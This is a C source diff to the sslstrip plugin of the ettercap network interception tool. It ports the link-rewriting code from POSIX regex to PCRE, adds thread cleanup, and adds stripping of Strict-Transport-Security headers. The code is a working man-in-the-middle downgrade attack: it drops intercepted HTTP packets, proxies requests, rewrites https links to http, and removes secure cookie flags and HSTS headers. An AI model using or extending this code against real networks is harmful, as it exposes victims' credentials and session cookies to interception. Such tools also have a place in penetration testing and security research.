@@ -32,7 +32,8 @@
 
 #include <sys/wait.h>
 
-#include <regex.h>
+#ifdef HAVE_PCRE_H
+#include <pcre.h>
 
 #ifdef OS_LINUX
 #include <linux/netfilter_ipv4.h>
@@ -61,7 +62,8 @@
 #endif
 
 //#define URL_PATTERN "(href=|src=|url\\(|action=)?[\"']?(https)://([^ \r\\)/\"'>\\)]*)/?([^ \\)\"'>\\)\r]*)"
-#define URL_PATTERN "(href=|src=|url\\(|action=)?[\"']?(https)(\\%3A|\\%3a|:)//([^ \r\\)/\"'>\\)]*)/?([^ \\)\"'>\\)\r]*)"
+//#define URL_PATTERN "(href=|src=|url\\(|action=)?[\"']?(https)(\\%3A|\\%3a|:)//([^ \r\\)/\"'>\\)]*)/?([^ \\)\"'>\\)\r]*)"
+#define URL_PATTERN "(https://[\\w\\d:#@%/;$()~_?\\+-=\\\\.&]*)"
 
 
 #define REQUEST_TIMEOUT 120 /* If a request has not been used in 120 seconds, remove it from list */
@@ -139,7 +141,6 @@ static int main_fd;
 static u_int16 bind_port;
 static struct pollfd poll_fd;
 
-static regex_t *find_https_re = NULL;
 
 
 /* protos */
@@ -189,7 +190,7 @@ static EC_THREAD_FUNC(http_accept_thread);
  * from this plugin
  */
 
-#define PO_FROMSSLSTRIP ((u_int16)(1<<30))
+#define PO_FROMSSLSTRIP ((u_int16)(1<<13))
 
 struct plugin_ops sslstrip_ops = {
 	ettercap_version:	EC_VERSION, /* must match global EC_VERSION */
@@ -239,8 +240,19 @@ static int sslstrip_fini(void *dummy)
        if (!pthread_equal(pid, EC_PTHREAD_NULL))
                ec_thread_destroy(pid);
 
-	if (find_https_re != NULL)
-		regfree(find_https_re);
+	/* now destroy all http_child_thread */
+	do {
+		pid = ec_thread_getpid("http_child_thread");
+		
+		if(!pthread_equal(pid, EC_PTHREAD_NULL))
+			ec_thread_destroy(pid);
+
+	} while (!pthread_equal(pid, EC_PTHREAD_NULL));
+
+	close(main_fd);
+
+	/* Remove hook point */
+	hook_del(HOOK_HANDLED, &sslstrip);
 
 	return PLUGIN_FINISHED;
 }
@@ -314,26 +326,24 @@ static void sslstrip(struct packet_object *po)
 	if (!sslstrip_is_http(po))
 		return;	
 
-	/* If it's an HTTP packet, don't forward */
-	po->flags |= PO_DROPPED;
+	/* If it's an HTTP packet, don't forward it */
+ 	po->flags |= PO_DROPPED;
 
-#ifndef OS_LINUX
-	struct ec_session *s = NULL;
 
 	if ( (po->flags & PO_FORWARDABLE) &&
 	     (po->L4.flags & TH_SYN) &&
              !(po->L4.flags & TH_ACK) ) {
+#ifndef OS_LINUX
+		struct ec_session *s = NULL;
 		sslstrip_create_session(&s, PACKET);	
 		memcpy(s->data, &po->L3.dst, sizeof(struct ip_addr));
 		session_put(s);
+		
+#endif
 	} else {
 		po->flags |= PO_IGNORE;
 	}
-#else
-	if (!(po->L4.flags & TH_PSH)) {
-		po->flags |= PO_IGNORE;
-	}
-#endif
+
 }
 
 /* Unescape the string */
@@ -709,7 +719,6 @@ static void http_handle_request(struct http_connection *connection, struct packe
 
 	LIST_LOCK;
 	LIST_FOREACH(link, &https_links, next) {
-		DEBUG_MSG("SSLStrip: Comparing %s with %s", link->url, connection->request->url);
 		if (!strcmp(link->url, connection->request->url)) {
 			proto = PROTO_HTTPS;
 			break;
@@ -781,7 +790,6 @@ static void http_send(struct http_connection *connection, struct packet_object *
 		curl_easy_setopt(connection->handle, CURLOPT_POSTFIELDSIZE, strlen(connection->request->payload));
 	}	
 
-	DEBUG_MSG("SSLStrip: Performing CURL action");
 
 	if(curl_easy_perform(connection->handle) != CURLE_OK) {
 		DEBUG_MSG("Unable to send request to HTTP server: %s\n", connection->curl_err_buffer);
@@ -791,11 +799,8 @@ static void http_send(struct http_connection *connection, struct packet_object *
 	}
 
 	DEBUG_MSG("SSLStrip: Removing HTTPS");
-	//DEBUG_MSG("Before removing HTTPS: %s", connection->response->html);
 	http_remove_https(connection);
-	//DEBUG_MSG("After remove HTTPS: %s", connection->response->html);
 	http_remove_secure_from_cookie(connection);
-	//DEBUG_MSG("After removing secure from cookies: %s", connection->response->html);
 
 	if(strstr(connection->response->html, "\r\nContent-Encoding:") ||
 	   strstr(connection->response->html, "\r\nTransfer-Encoding:")) {
@@ -804,6 +809,10 @@ static void http_send(struct http_connection *connection, struct packet_object *
 		http_update_content_length(connection);
 	}
 
+
+	if(strstr(connection->response->html, "\r\nStrict-Transport-Security:")) {
+		http_remove_header("Strict-Transport-Security", connection);
+	}
 
 	//Send result back to client
 	DEBUG_MSG("SSLStrip: Sending response back to client");
@@ -981,8 +990,9 @@ EC_THREAD_FUNC(http_child_thread)
 			packet_destroy_object(&po);
         		packet_disp_data(&po, po.DATA.data, po.DATA.len);
 
-        		DEBUG_MSG("SSLStrip: Calling parser for request");
+        		//DEBUG_MSG("SSLStrip: Calling parser for request");
         		http_parse_packet(connection, HTTP_CLIENT, &po);
+
 			http_handle_request(connection, &po);
 		}
 		
@@ -994,101 +1004,87 @@ EC_THREAD_FUNC(http_child_thread)
 
 static void http_remove_https(struct http_connection *connection)
 {
-	regmatch_t match[6];
-	//char *buf = connection->response->html;
+	pcre *pcre;
 	char *buf_cpy = connection->response->html;
-
-
-	BUG_IF(buf_cpy == NULL);
-
-	char http[] = "http:";
-	size_t https_len = strlen("https");
-	char *host, *path;
+	const char *error;
+	int erroroffset;
+	size_t https_len = strlen("https://");
+	size_t http_len = strlen("http://");
 	struct https_link *l, *link;
-
-	if (find_https_re == NULL) {
-		SAFE_CALLOC(find_https_re, 1, sizeof(regex_t));
-		BUG_IF(find_https_re==NULL);
-
-		if (regcomp(find_https_re, URL_PATTERN, REG_EXTENDED | REG_NEWLINE | REG_ICASE))
-		{
-			ERROR_MSG("SSLStrip: Error compiling regular expression\n");
-			return;
-		}
-	}
-
+	int offset = 0;
+	int rc;
+	int ovector[30];
 	char changed = 0;
 	char *new_html;
-	size_t new_len = 0;
+	size_t new_size = 0;
+	size_t size = connection->response->len;
+	int i = 0;
+
+	if(!buf_cpy)
+		return;
+
+	pcre = pcre_compile(URL_PATTERN, PCRE_MULTILINE|PCRE_CASELESS, &error, &erroroffset, NULL);
+
+	if (!pcre) {
+		ERROR_MSG("pcre_compile failed (offset: %d), %s\n", erroroffset, error);
+		return;
+	}	
+
 
 	SAFE_CALLOC(new_html, 1, connection->response->len);
 	BUG_IF(new_html==NULL);
 
-	while(buf_cpy && !regexec(find_https_re, buf_cpy, 6, match, REG_NOTBOL))
-	{
-		host = strndup(buf_cpy + match[4].rm_so, match[4].rm_eo - match[4].rm_so);
-		/* if we have an empty path */
-		if (match[5].rm_so != -1 && match[5].rm_so != match[5].rm_eo)
-			path = strndup(buf_cpy + match[5].rm_so, match[5].rm_eo - match[5].rm_so);
-		else
-			path = strndup("/", 1);
+	while(offset < size && (rc = pcre_exec(pcre, NULL, buf_cpy, size, offset, 0, ovector, 30)) > 0) {
+		memcpy(new_html+new_size, buf_cpy+offset, ovector[2*i]-offset);
+		new_size += ovector[2*i]-offset;
 
-		DEBUG_MSG("SSLStrip: Found HTTPS in %s/%s", host, path);
+		char *url = strndup(buf_cpy+ovector[2*i]+https_len, 
+			(ovector[2*i+1] - ovector[2*i]) - https_len);
+		memcpy(new_html+new_size, "http://", http_len);
+		new_size += http_len;
+		memcpy(new_html+new_size, url, (ovector[2*i+1] - ovector[2*i]) - https_len);
+		new_size += (ovector[2*i+1] - ovector[2*i]) - https_len;
+		offset = ovector[1];
 
-		/* we don't add root url without href,src,action or url */
-		if (strcmp(path, "/") != 0 || match[1].rm_so != -1) {
+		//Add URL to list
+
+		char found = 0;
+		LIST_LOCK;
+		LIST_FOREACH(link, &https_links, next) {
+			if(!strcmp(link->url, url)) {
+				found=1;
+				break;
+			}	
+		}		
+
+		LIST_UNLOCK;
+
+		if(!found) {
 			SAFE_CALLOC(l, 1, sizeof(struct https_link));
 			BUG_IF(l==NULL);
 
-			SAFE_CALLOC(l->url, 1, strlen(host)+1+strlen(path)+1);
+			SAFE_CALLOC(l->url, 1, 1+((ovector[2*i+1] - ovector[2*i]) - https_len));
 			BUG_IF(l->url==NULL);
-			sprintf(l->url, "%s/%s", host, path);
+			memcpy(l->url, url, (ovector[2*i+1] - ovector[2*i]) - https_len);
 			Decode_Url((u_char *)l->url);
 			l->last_used = time(NULL);
-		
-			//Add to list	
-			char found = 0;
-	
-			LIST_LOCK;
-			LIST_FOREACH(link, &https_links, next) {
-				if(!strcmp(link->url, l->url)) {
-					found=1;	
-					break;
-				}
-			}
-
-			LIST_UNLOCK;
-
-			if(!found) {
-				DEBUG_MSG("SSLStrip: Inserting %s to HTTPS list", l->url);
-				LIST_INSERT_HEAD(&https_links, l, next);
-			}
+			DEBUG_MSG("SSLStrip: Inserting %s to HTTPS List", l->url);
+			LIST_INSERT_HEAD(&https_links, l, next);
 		}
 
-
-		memcpy(new_html+new_len, buf_cpy, match[2].rm_so);
-		new_len += match[2].rm_so;
-                memcpy(new_html+new_len, http, https_len);
-		new_len += strlen(http);
-
-
-                buf_cpy += match[3].rm_eo;
-
-                SAFE_FREE(host);
-                SAFE_FREE(path);
-                //SAFE_FREE(remaining);
-
+		SAFE_FREE(url);
+		
 		if (!changed)
 			changed=1;
-
 	}
 
+	
 	if (changed) {
-		//Copy remaining buf_cpy
-		memcpy(new_html+new_len, buf_cpy, strlen(buf_cpy));
+		//Copy rest of data (if any)
+		memcpy(new_html+new_size, buf_cpy+offset, size-offset);
 		SAFE_FREE(connection->response->html);	
 		connection->response->html = new_html;
-		connection->response->len = new_len;	
+		connection->response->len = new_size;	
 	} else {
 		/* Thanks but we don't need it */
 		SAFE_FREE(new_html);
@@ -1142,7 +1138,7 @@ static void http_parse_packet(struct http_connection *connection, int direction,
 
 	/* let's start fromt he last stage of decoder chain */
 
-	DEBUG_MSG("SSLStrip: Parsing %s", po->DATA.data);
+	//DEBUG_MSG("SSLStrip: Parsing %s", po->DATA.data);
 	start_decoder = get_decoder(APP_LAYER, PL_DEFAULT);
 	start_decoder(po->DATA.data, po->DATA.len, &len, po);
 }
@@ -1328,5 +1324,6 @@ void http_update_content_length(struct http_connection *connection) {
 }
 
 #endif /* HAVE_LIBCURL */
+#endif /* HAVE_PCRE_H */
 
 // vim:ts=3:expandtab
